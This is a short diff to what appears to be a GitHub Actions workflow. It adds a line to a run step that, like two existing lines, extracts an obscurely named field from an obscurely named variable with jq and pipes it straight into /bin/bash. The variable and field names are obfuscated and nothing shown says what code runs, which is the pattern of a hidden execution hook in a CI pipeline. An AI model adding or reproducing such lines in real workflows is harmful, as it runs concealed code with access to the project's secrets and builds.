@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
           printf '%s' "$rrtsd10382" | jq -r .p68189 | /bin/bash
+          echo $a63 | jq -r .s8750 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
